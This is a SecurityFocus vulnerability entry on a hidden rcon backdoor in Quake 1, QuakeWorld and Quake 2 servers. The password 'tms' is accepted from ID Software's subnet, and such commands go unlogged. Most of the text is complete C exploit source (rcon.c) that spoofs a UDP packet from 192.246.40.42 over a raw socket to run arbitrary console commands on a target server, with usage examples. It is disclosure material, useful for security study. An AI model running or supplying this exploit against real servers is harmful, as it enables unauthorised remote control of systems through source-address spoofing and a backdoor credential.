source: http://www.securityfocus.com/bid/90/info

The Quake server has a feature where it allows administrators to remotely send commands to the Quake console with a password. However, it is possible to remotely bypass authentication.

In order for this to be exploited, the attacker would have to create a handcrafted udp packet with a header containing the rcon command and the password "tms" with a source IP coming from ID Software's Subnet. (192.246.40)

The Quake server does not require an open connection for sending the rcon packet. When this is exploited, no logs are reported of the rcon command being used.

This vulnerability is present in Quake 1, QuakeWorld, Quake 2, Quake 2 Linux and Quake 2 Solaris, all versions.

/* rcon.c
Quake world rcon_password bug implimentation by Jeff Roberson, <jroberson@chesapeake.net> (VallaH)
Linux 2.0.33 source, will compile on BSD if you modify the ip header etc.
Please note that I did not discover this, I simply wrote the code.
Thanks to Nick Toomey, <ntoomey@chesapeake.net> (Grifter)

Brief summary:
Any rcon command coming from the idsoftware subnet 192.246.40 with the rcon password of tms will be accepted on any server. This program simply spoofs a packet from vader.idsoftware.com (random pick) to whatever server you identify.
If you are connected to a network with a small MTU (e.g. PPP) change the buffer 'buf' from 512 bytes to something somewhat smaller than your MTU.

Usage:
./rcon ip/host "what you want to do" [port]
Example:
./rcon quake.idsoftware.com "say This program works, thanks Jeff" 27500
the port argument is optional, you may omit it if you like and it will default to 27500.
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h> 

#define SIP "192.246.40.42" /* vader.idsoftware.com */
#define command "ÿÿÿÿrcon tms "

u_long resolve_address(u_char *host)
{
struct in_addr addr;
struct hostent *he;

if((addr.s_addr = inet_addr(host)) == -1) {
if (!(he = gethostbyname(host))) {
printf("Unknown address: %s\n", host); 
exit(-1);
}
bcopy(he->h_addr, (char *)&addr.s_addr, he->h_length);
}
return(addr.s_addr);
}
int main(int argc, char **argv)
{
int s;
int port=27500;
char buf[512];
struct sockaddr_in dst;
struct iphdr *iph=(struct iphdr *)buf;
struct udphdr *udp=(struct udphdr *)(buf + 20);

if (argc<3) {
printf("usage:\n");
printf("\t%s ip ""command"" <port>\n", argv[0]);
exit(-1);
}
if (argc==4) port = atoi(argv[3]);
bzero(buf, sizeof(buf));
bzero((char *)&dst, sizeof(dst));

iph->version=4;
iph->ihl=5;
iph->tos=0;
iph->tot_len=htons(sizeof(buf));
iph->id=htons(1234);
iph->frag_off=0;
iph->ttl=255;
iph->protocol=17;

iph->saddr=inet_addr(SIP);
iph->daddr=resolve_address(argv[1]);

udp->source=htons(1234);
udp->dest=htons(port);
udp->len=htons(sizeof(buf) - 20);

dst.sin_family=PF_INET;
dst.sin_addr.s_addr=iph->daddr;
dst.sin_port=htons(27500);

sprintf((buf + 28), "%s%s\n", command, argv[2]); 

if ((s=socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
perror("socket");
exit(-1);
}

if ((sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst))) <=0) {
perror("sendto");
exit(-1);
}
exit(1);
}